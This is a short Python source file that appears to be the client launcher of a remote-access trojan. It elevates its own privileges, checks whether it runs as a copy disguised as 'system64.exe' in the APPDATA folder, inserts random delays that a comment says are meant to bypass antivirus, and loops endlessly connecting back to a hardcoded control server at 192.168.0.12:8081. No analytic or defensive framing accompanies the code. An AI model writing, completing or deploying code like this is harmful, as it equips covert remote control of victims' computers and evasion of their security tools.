from core.connection import conn
from core.connection.handler import connection_handler
from core.utils import display_msg, elevate_script
import os
import sys
import time
import random




def test_for_startup_app():
    """
    Checks if the current executable is the one copied to appdata directory, if it is, 
    add  random delay to execution to bypass AV

    
    Returns:
        [type] -- [description]
    """    
    app_data = os.getenv("APPDATA")
    app_data_exe = app_data +"\\"+"system64.exe"
    exe_name = sys.executable
    # display_msg("Current Executable name: "+ exe_name)
    # display_msg("App data exe name: "+ app_data_exe)
    if exe_name == app_data_exe:
        random_dur = random.randint(50,250)
        time.sleep(random_dur)
        return True
    else:
        time.sleep(random.randint(1,10))
        return False


if __name__ == "__main__":
    elevate_script()
    while True:
        try:
            
            test_for_startup_app()
            display_msg("Trying to connect ", "y")
            client = conn.Client("192.168.0.12", 8081)
            client.connect_with_server()
            connection_handler(client)
            client.close()
        except KeyboardInterrupt:
            display_msg("Keyboard Interrupt, Exiting", "r")
            sys.exit(0)
        except Exception as err:
            display_msg("Unable to establish connection " + str(err), "r")
            dur = random.randint(100, 150)
            display_msg("Going to sleep for "+ str(dur))
            time.sleep(dur)

